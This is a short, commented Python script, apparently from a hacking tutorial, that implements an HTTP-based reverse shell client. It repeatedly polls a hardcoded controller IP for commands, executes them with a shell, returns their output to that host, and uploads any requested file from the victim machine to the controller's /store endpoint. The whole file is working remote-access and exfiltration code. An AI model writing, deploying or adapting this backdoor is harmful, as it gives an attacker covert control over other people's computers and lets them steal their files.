#first import all required module for this script
import requests
import subprocess 
import time
import os

#first we write infinite loop for sending request and other operation
while True: 
    req = requests.get('http://192.168.208.131')# Send GET request to host machine and the ip address which we use here are server ip address
    command = req.text  # Store the received txt into command variable

    if 'terminate' in command: #here terminate command use for break the connection
        break 

    elif 'grab' in command: # here we use grab command to send file from client pc to server pc
        grab,path=command.split(' ') #it help to differentiate grab command & file name

        if os.path.exists(path): #look for file exits or not
            url='http://192.168.208.131/store'   #Append /store in the URL
            files = {'file': open(path, 'rb')} # Add a dictionary key where file will be stored
            r=requests.post(url, files=files) # Send the file
            #requests library use POST method called "multipart/form-data"
        else:
            post_response = requests.post(url='http://192.168.208.131', data='[-] Not able to find the file !' )
    else:
        CMD =  subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
        post_response = requests.post(url='http://192.168.208.131', data=CMD.stdout.read() ) 
        post_response = requests.post(url='http://192.168.208.131', data=CMD.stderr.read() )  
    time.sleep(1)

#that's it here we done Client.py python script
